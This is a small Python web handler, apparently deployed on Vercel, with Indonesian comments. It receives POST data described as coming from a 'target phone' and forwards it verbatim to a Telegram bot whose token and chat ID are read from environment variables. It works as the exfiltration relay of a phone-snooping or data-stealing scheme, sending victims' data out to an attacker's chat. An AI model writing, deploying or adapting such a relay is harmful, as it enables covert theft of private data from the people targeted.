from http.server import BaseHTTPRequestHandler
import os
import urllib.request
import urllib.parse

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # 1. Baca data dari HP target
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        # 2. Ambil token dari Environment Variables Vercel
        token = os.environ.get('BOT_TOKEN')
        chat_id = os.environ.get('CHAT_ID')

        if not token or not chat_id:
            self.send_response(500)
            self.end_headers()
            return

        # 3. Teruskan ke Telegram
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = urllib.parse.urlencode({
                'chat_id': chat_id,
                'text': post_data
            }).encode('utf-8')

            req = urllib.request.Request(url, data=payload, method='POST')
            with urllib.request.urlopen(req, timeout=10) as response:
                response.read()

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())
